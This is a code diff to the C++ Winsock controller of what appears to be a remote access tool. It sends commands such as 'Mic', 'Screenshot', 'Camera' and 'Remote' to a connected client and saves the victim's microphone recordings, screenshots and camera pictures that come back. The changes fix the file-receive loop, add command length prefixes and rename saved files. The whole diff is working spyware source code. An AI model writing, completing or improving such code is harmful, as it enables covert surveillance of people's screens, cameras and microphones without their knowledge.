@@ -9,6 +9,11 @@
 
 #include "Header.h"
 
+#define FILE_TYPE_RECORDING 0
+#define FILE_TYPE_SCREENSHOT 1
+#define FILE_TYPE_CAMERA 2
+
+
 int main(int argc, char* argv[]) {
 	WSADATA wsaData;
 	SOCKET clientSocket = INVALID_SOCKET;
@@ -103,13 +108,25 @@ int main(int argc, char* argv[]) {
 
 		if (command.empty())continue;
 
+		//send command size first
+		DWORD inputSize = input.size();
+
+		iResult = send(clientSocket, (char*)&inputSize, sizeof(inputSize), 0);
+		if (iResult < 0) {
+			printf("[ERROR] send. %d\n", WSAGetLastError());
+			closesocket(clientSocket);
+			WSACleanup();
+			return 7;
+		}
+
 		// send command
 		iResult = send(clientSocket, input.c_str(), input.size(), 0);
+
 		if (iResult > 0) {
 			printf("[OK] Command sent.\n", iResult);
 		}
 		else if (iResult < 0) {
-			printf("[ERROR] recv. %d\n", WSAGetLastError());
+			printf("[ERROR] send. %d\n", WSAGetLastError());
 			closesocket(clientSocket);
 			WSACleanup();
 			return 8;
@@ -127,17 +144,17 @@ int main(int argc, char* argv[]) {
 
 		if (command.compare("Mic") == 0) {
 			//Receive client's micro recording.
-			receiveFile("Recording", clientSocket);
+			receiveFile(FILE_TYPE_RECORDING, clientSocket);
 		}
 
 		if (command.compare("Screenshot") == 0) {
 			//Receive client's screenshot.
-			receiveFile("Screenshot", clientSocket);
+			receiveFile(FILE_TYPE_SCREENSHOT, clientSocket);
 		}
 
 		if (command.compare("Camera") == 0) {
 			//Receive client's camera picture.
-			receiveFile("Camera", clientSocket);
+			receiveFile(FILE_TYPE_CAMERA, clientSocket);
 		}
 
 		if (command.compare("Remote") == 0) {
@@ -244,8 +261,8 @@ void sendFile(const char* fileName, SOCKET clientSocket) {
 	}
 }
 // receive file from client and save
-void receiveFile(const char* fileType, SOCKET clientSocket) {
-	char* buffer = NULL, *filePath = NULL;
+void receiveFile(int fileType, SOCKET clientSocket) {
+	char* buffer = NULL, * filePath = NULL;
 	HANDLE file = NULL;
 	int iResult = 0;
 	DWORD dwByteWritten = 0;
@@ -262,21 +279,28 @@ void receiveFile(const char* fileType, SOCKET clientSocket) {
 	if (isExist) {
 		time_t t = time(0);
 		char* now = ctime(&t);
+		now[strlen(now) - 1] = '\0';
 
 		string fileName = "";
-		fileName += fileType;
-		fileName += "-";
-		fileName += now;
 
-		if (strncmp(fileType, "Recording", strlen(fileType) == 0)) {
+
+		if (fileType == FILE_TYPE_RECORDING) {
+			fileName += "Recording ";
+			fileName += now;
 			fileName += ".mp3";
 		}
-		if (strncmp(fileType, "Screenshot", strlen(fileType) == 0)) {
+		if (fileType == FILE_TYPE_SCREENSHOT) {
+			fileName += "Screenshot ";
+			fileName += now;
+			fileName += ".bmp";
+		}
+		if (fileType == FILE_TYPE_CAMERA) {
+			fileName += "Camera ";
+			fileName += now;
 			fileName += ".jpg";
 		}
-		if (strncmp(fileType, "Camera", strlen(fileType) == 0)) {
-			fileName += ".jpg";
-		}
+
+		fileName = regex_replace(fileName, regex(":"), "-");
 
 		file = CreateFile(fileName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (file == INVALID_HANDLE_VALUE) {
@@ -293,7 +317,7 @@ void receiveFile(const char* fileType, SOCKET clientSocket) {
 		}
 
 		// receive file data and write
-		DWORD tempFileSize = 0;
+		DWORD tempFileSize = fileSize;
 		do {
 			buffer = (char*)calloc(BUFSIZ, sizeof(char));
 			if (buffer) {
@@ -312,18 +336,21 @@ void receiveFile(const char* fileType, SOCKET clientSocket) {
 					return;
 				}
 
-				tempFileSize += iResult;
+				tempFileSize -= iResult;
 				free(buffer);
 			}
-		} while (tempFileSize < fileSize);
+		} while (tempFileSize > 0);
 
 		if (file != INVALID_HANDLE_VALUE) {
 			filePath = (char*)calloc(MAX_PATH + 1, sizeof(char));
-			GetFinalPathNameByHandle(file, filePath, MAX_PATH, FILE_NAME_NORMALIZED);
-			printf("File saved at %s\n", filePath);
-			free(filePath);
+			if (filePath) {
+				GetFinalPathNameByHandle(file, filePath, MAX_PATH, FILE_NAME_NORMALIZED);
+				printf("File saved at %s\n", filePath);
+				free(filePath);
+			}
+			CloseHandle(file);
 		}
-		CloseHandle(file);
+
 	}
 
 }
